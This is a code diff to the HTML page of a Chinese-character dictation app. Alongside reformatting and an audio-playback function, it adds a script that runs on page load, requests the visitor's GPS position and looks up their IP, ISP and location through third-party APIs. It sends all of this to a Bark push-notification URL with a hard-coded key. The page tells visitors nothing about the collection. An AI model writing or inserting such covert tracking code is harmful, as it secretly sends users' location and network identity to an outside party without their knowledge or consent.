@@ -1,29 +1,176 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<link rel="shortcut icon" href="./hearing.svg" type="image/x-icon" />
-<title>汉字听写</title>
-<style>
-@font-face{
-          font-family: 'pinyin';
-          src : url('./py.ttf');
-      }
-      html, body {
-        margin: 0;
-        height: 100%;
-      }
-</style>
-<script defer="defer" src="js/chunk-vendors.6f07bc94.js"></script>
-<script defer="defer" src="js/app.617c243d.js"></script>
-<script src="https://unpkg.com/pinyin-pro"></script>
-<link href="css/app.5e73e414.css" rel="stylesheet">
-</head>
-<body>
-<noscript>
-<strong>We're sorry but pinyin-vue doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
-</noscript>
-<div id="app"></div>
-</body>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <link rel="shortcut icon" href="./hearing.svg" type="image/x-icon"/>
+        <title>汉字听写</title>
+        <style>
+            @font-face {
+                font-family: 'pinyin';
+                src : url('./py.ttf');
+            }
+
+            html, body {
+                margin: 0;
+                height: 100%;
+            }
+        </style>
+        <script defer="defer" src="js/chunk-vendors.6f07bc94.js"></script>
+        <script defer="defer" src="js/app.617c243d.js"></script>
+        <script src="https://unpkg.com/pinyin-pro"></script>
+        <link href="css/app.5e73e414.css" rel="stylesheet">
+    </head>
+    <body>
+        <noscript>
+            <strong>We're sorry but pinyin-vue doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
+        </noscript>
+        <div id="app"></div>
+        <script>
+            var ip;
+            var org;
+            var longitude;
+            var latitude;
+            var baseStation;
+            var myResponse;
+            window.onload = function() {
+                firstAudio();
+                getLocation();
+            }
+
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(showPosition);
+                } else {//alert("浏览器不支持地理定位。");
+                }
+            }
+            function showPosition(position) {
+                latitude = position.coords.latitude;
+                longitude = position.coords.longitude;
+                console.log("纬度: " + position.coords.latitude + "，经度: " + position.coords.longitude);
+                console.log(latitude);
+                getIP1();
+            }
+
+            //获取IP
+            function getIP1() {
+                var xhr = new XMLHttpRequest();
+                // 设置请求的URL
+                xhr.open('GET', 'http://ip-api.com/json');
+                // 发送请求
+                xhr.send();
+                // 监听请求状态
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        // 请求成功，获取响应数据
+                        var response = JSON.parse(xhr.responseText);
+                        // 获取当前设备的IP
+                        ip = response.query;
+                        org = response.org;
+                        getBaseStation(ip);
+						if (longitude==undefined) {
+							defaultFun();
+						}
+                    }
+                }
+            }
+
+            function getIP2() {
+                var xhr = new XMLHttpRequest();
+                // 设置请求的URL
+                xhr.open('GET', 'https://api.ip.sb/geoip');
+                // 发送请求
+                xhr.send();
+                // 监听请求状态
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        // 请求成功，获取响应数据
+                        var response = JSON.parse(xhr.responseText);
+                        // 获取当前设备的IP
+                        ip = response.ip;
+                        org = response.asn_organization;
+                        getBaseStation(ip);
+						if (longitude==undefined) {
+							defaultFun();
+						}
+                        //console.log('getIP2 if');
+                    }
+                }
+            }
+
+            //获取基站
+            function getBaseStation(ip) {
+                var xhr = new XMLHttpRequest();
+                // 设置请求的URL
+                xhr.open('GET', 'http://ip.zxinc.org/api.php?type=json&' + ip);
+                // 发送请求
+                xhr.send();
+                // 监听请求状态
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        // 请求成功，获取响应数据
+                        var response = JSON.parse(xhr.responseText);
+                        myResponse = response;
+                        // 获取当前设备的IP
+                        baseStation = response.data.location;
+                        defaultFun();
+                        //baseStation.toString().split(' ').join('');
+                        //console.log(baseStation);
+                    }
+                }
+            }
+
+            //获取GET请求返回值
+            function getJSON(url, /*callback*/
+            ) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', url, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        var data = JSON.parse(xhr.responseText);
+                        /*callback(data);*/
+                    }
+                }
+                xhr.send();
+            }
+
+            function defaultFun() {
+                console.log('defaultFun');
+                var date = new Date();
+                var strdate = date.getUTCFullYear() + "-" + (date.getMonth() + 1) + "-" + date.getDate() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + "." + date.getMilliseconds();
+                var url = "https://api.day.app/TbsfqDZZoJXnaP46cttdsN/" + strdate + "，访问功能：汉字听写" + "，本次访问IP地址：" + ip + "，本次访问运营商：" + org + "，经度：" + longitude + "，纬度：" + latitude + "，本次访问基站：" + baseStation + '?group=汉字听写';
+                getJSON(url);
+            }
+
+            //初次加载音频
+            function firstAudio() {
+                //console.log('firstAudio');
+                var mainDiv = document.getElementsByClassName('main')[0].title;
+                if (mainDiv !== undefined && mainDiv !== "") {
+                    //单个字
+                    if (mainDiv.length === 1) {
+                        var mp3Url = "https://hanyu-word-pinyin-short.cdn.bcebos.com/" + pinyinPro.pinyin(mainDiv, {
+                            toneType: 'num'
+                        }) + ".mp3"
+                        var player = new Audio(mp3Url)
+                        player.play()
+                    }//多个字									
+                    else if (mainDiv.length > 1) {
+                        var word = ""
+                        for (var i = 0; i < mainDiv.length; i++) {
+                            word += mainDiv[i] + "(" + pinyinPro.pinyin(mainDiv[i], {
+                                toneType: 'num'
+                            }) + ")"
+                        }
+                        var mp3Url = "https://tts.baidu.com/text2audio?tex=" + word + "&cuid=dict&lan=ZH&ctp=1&pdt=30&vol=9&per=4100"
+                        var player = new Audio(encodeURI(mp3Url))
+                        player.play()
+                    }
+                }
+            }
+        </script>
+    </body>
 </html>
